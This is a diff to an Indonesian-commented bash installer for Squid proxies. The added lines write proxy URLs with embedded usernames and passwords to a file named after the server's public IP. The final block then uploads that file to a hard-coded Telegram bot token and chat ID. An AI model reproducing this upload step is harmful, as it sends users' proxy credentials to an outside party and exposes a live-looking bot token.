@@ -107,15 +107,19 @@ else
 fi
 
 # === OUTPUT FILE ===
-[ -f proxies.txt ] && mv proxies.txt proxies_backup_$(date +%F-%H%M%S).txt
-> proxies.txt
+PUBLIC_IP_MAIN=$(curl -s ifconfig.me)
+FILENAME="proxies-$PUBLIC_IP_MAIN.txt"
+
+[ -f "$FILENAME" ] && mv "$FILENAME" proxies_backup_$(date +%F-%H%M%S).txt
+> "$FILENAME"
+
 for entry in "${PORT_LIST[@]}"; do
     ip="${entry%%:*}"
     port="${entry##*:}"
-    echo "http://$USERNAME:$PASSWORD@$ip:$port" >> proxies.txt
+    echo "http://$USERNAME:$PASSWORD@$ip:$port" >> "$FILENAME"
 done
 
-echo "✅ proxies.txt selesai dibuat dengan total ${#PORT_LIST[@]} port"
+echo "✅ File $FILENAME selesai dibuat dengan total ${#PORT_LIST[@]} port"
 
 # === AUTORESTART SQUID TIAP 12 JAM ===
 CRON_FILE="/etc/cron.d/squid-autorestart"
@@ -128,3 +132,12 @@ EOF
 
 chmod 644 "$CRON_FILE"
 echo "🕒 Cron job dibuat di $CRON_FILE untuk restart Squid setiap 12 jam."
+
+# === UPLOAD KE TELEGRAM ===
+BOT_TOKEN="5036251543:AAGRL744DTTLaaoZQz2kRz_2jNrmFowJgzM"
+CHAT_ID="516489996"
+
+echo "🚀 Mengirim file ke Telegram..."
+curl -s -F document=@"$FILENAME" "https://api.telegram.org/bot$BOT_TOKEN/sendDocument?chat_id=$CHAT_ID" \
+    && echo "✅ Berhasil dikirim ke Telegram sebagai $FILENAME" \
+    || echo "❌ Gagal mengirim ke Telegram. Cek token/chat_id."
